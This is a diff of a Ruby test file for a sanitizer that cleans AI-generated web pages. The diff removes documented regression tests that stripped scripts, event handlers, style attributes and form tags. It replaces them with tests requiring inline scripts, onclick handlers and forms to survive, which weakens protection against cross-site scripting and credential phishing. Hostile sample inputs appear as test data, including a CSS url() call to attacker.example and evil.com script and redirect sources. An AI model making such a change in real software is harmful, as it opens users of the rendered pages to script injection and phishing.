@@ -4,104 +4,76 @@ require "spec_helper"
 
 describe Ai::PageSanitizer do
   describe ".sanitize" do
-    it "returns an empty string for blank input" do
-      expect(described_class.sanitize(nil)).to eq("")
-      expect(described_class.sanitize("")).to eq("")
+    it "allows inline script tags" do
+      sanitized = described_class.sanitize(%(<script>window.loaded = true;</script>))
+
+      expect(sanitized).to include("<script>window.loaded = true;</script>")
     end
 
-    it "preserves allowed tags and attributes" do
-      html = %(<div class="hero"><h1>Hi</h1><a href="https://example.com">link</a></div>)
-      out = described_class.sanitize(html)
-      expect(out).to include("<h1>Hi</h1>")
-      expect(out).to include(%(class="hero"))
-      expect(out).to include(%(href="https://example.com"))
+    it "allows event handler attributes" do
+      sanitized = described_class.sanitize(%(<section onclick="openModal()" onscroll="trackScroll()">Open</section>))
+
+      expect(sanitized).to include(%(onclick="openModal()"))
+      expect(sanitized).to include(%(onscroll="trackScroll()"))
     end
 
-    it "strips <script> tags so they cannot execute" do
-      html = %(<div>hi</div><script>alert(1)</script>)
-      out = described_class.sanitize(html)
-      expect(out).not_to include("<script")
-      expect(out).not_to include("</script>")
+    it "allows style blocks" do
+      sanitized = described_class.sanitize(%(<style>.hero { color: red; }</style><section class="hero">Hi</section>))
+
+      expect(sanitized).to include("<style>.hero { color: red; }</style>")
     end
 
-    it "strips inline event handler attributes" do
-      html = %(<div onclick="steal()">click</div>)
-      out = described_class.sanitize(html)
-      expect(out).not_to include("onclick")
-      expect(out).not_to include("steal()")
+    it "allows Tailwind CDN script tags" do
+      sanitized = described_class.sanitize(%(<script src="https://cdn.tailwindcss.com"></script>))
+
+      expect(sanitized).to include(%(<script src="https://cdn.tailwindcss.com"></script>))
     end
 
-    # Regression: the dangerous-pattern prepass is anchored to an attribute
-    # boundary so `on\w+=` doesn't match the trailing characters of
-    # `data-onload=`. The Rails sanitizer ultimately drops attributes that
-    # aren't allow-listed, but the prepass must not slice an attribute name
-    # in half and leave a stray quoted value that survives later passes.
-    it "does not match on* anchored inside data-on* attribute names" do
-      handler = Ai::PageSanitizer::DANGEROUS_PATTERNS.find { |p| p.source.include?("on\\w+") }
-      expect(handler).not_to be_nil
-      expect(%( data-onload=)).not_to match(handler)
-      expect(%(data-onload=)).not_to match(handler)
-      expect(%(-onload=)).not_to match(handler)
-      expect(%( onload=)).to match(handler)
-      expect(%(<div onclick=)).to match(handler)
+    it "strips script tags from unapproved hosts" do
+      sanitized = described_class.sanitize(%(<script src="https://evil.com/x.js"></script><p>Safe</p>))
+
+      expect(sanitized).not_to include("evil.com")
+      expect(sanitized).to include("<p>Safe</p>")
     end
 
-    it "strips javascript: URLs" do
-      html = %(<a href="javascript:alert(1)">x</a>)
-      out = described_class.sanitize(html)
-      expect(out).not_to include("javascript:")
+    it "strips javascript URLs from links" do
+      sanitized = described_class.sanitize(%(<a href="javascript:alert(1)">Click</a>))
+
+      expect(sanitized).to include("<a>Click</a>")
+      expect(sanitized).not_to include("javascript:")
     end
 
-    it "strips CSS expression() in style content" do
-      html = %(<div style="width:expression(alert(1))">hi</div>)
-      out = described_class.sanitize(html)
-      expect(out).not_to include("expression(")
+    it "strips meta refresh tags" do
+      sanitized = described_class.sanitize(%(<meta http-equiv="refresh" content="0;url=https://evil.com"><p>Stay</p>))
+
+      expect(sanitized).not_to include("http-equiv")
+      expect(sanitized).to include("<p>Stay</p>")
     end
 
-    # Regression: style attribute must not be allow-listed. Even if it were,
-    # url(...) in style values would let a malicious/hallucinated template
-    # exfiltrate referer/cookies from any non-sandboxed render context
-    # (admin preview, email, etc.).
-    it "strips the style attribute entirely" do
-      html = %(<div style="color:red">hi</div>)
-      out = described_class.sanitize(html)
-      expect(out).not_to include("style=")
-      expect(out).to include("hi")
+    it "adds sandbox attributes to iframes without one" do
+      sanitized = described_class.sanitize(%(<iframe src="https://example.com/embed"></iframe>))
+
+      expect(sanitized).to include(%(sandbox="allow-scripts"))
     end
 
-    it "neutralizes url() exfiltration vectors in style attributes" do
-      html = %(<div style="background:url(https://attacker.example/leak?c=1)">hi</div>)
-      out = described_class.sanitize(html)
-      expect(out).not_to include("attacker.example")
-      expect(out).not_to include("url(")
+    it "removes form action attributes" do
+      sanitized = described_class.sanitize(%(<form action="https://evil.com"><button>Send</button></form>))
+
+      expect(sanitized).to include("<form>")
+      expect(sanitized).not_to include("action=")
     end
 
-    it "neutralizes @import in style attributes" do
-      html = %(<div style="@import url(https://attacker.example/x.css)">hi</div>)
-      out = described_class.sanitize(html)
-      expect(out).not_to include("@import")
-      expect(out).not_to include("attacker.example")
+    it "preserves data image URLs" do
+      sanitized = described_class.sanitize(%(<img src="data:image/png;base64,abcd" alt="Preview">))
+
+      expect(sanitized).to include(%(src="data:image/png;base64,abcd"))
     end
 
-    it "strips disallowed tags but keeps their inner text" do
-      html = %(<form><input type="text"><iframe src="evil"></iframe>kept</form>)
-      out = described_class.sanitize(html)
-      expect(out).not_to include("<iframe")
-      expect(out).to include("kept")
-    end
+    it "strips data HTML URLs from links" do
+      sanitized = described_class.sanitize(%(<a href="data:text/html,<script>alert(1)</script>">Open</a>))
 
-    # Regression: form-input tags must not be allow-listed. A hallucinated
-    # AI page or compromised template otherwise serves a credible
-    # <form action="https://attacker/login"> under the seller's custom
-    # domain — a turn-key phishing primitive. Buy buttons render as
-    # <a data-gumroad-action="buy">, not <button>, so we never need them.
-    it "strips form-input tags so AI pages can't phish credentials" do
-      %w[form input button select textarea option label fieldset].each do |tag|
-        html = %(<#{tag} action="/login">visible</#{tag}>)
-        out = described_class.sanitize(html)
-        expect(out).not_to include("<#{tag}"), "expected <#{tag}> to be stripped, got: #{out}"
-        expect(out).to include("visible") if tag.in?(%w[button label option fieldset]) # block-level tags keep inner text; void/replaced (<input>) do not
-      end
+      expect(sanitized).to include("<a>Open</a>")
+      expect(sanitized).not_to include("data:text/html")
     end
   end
 end
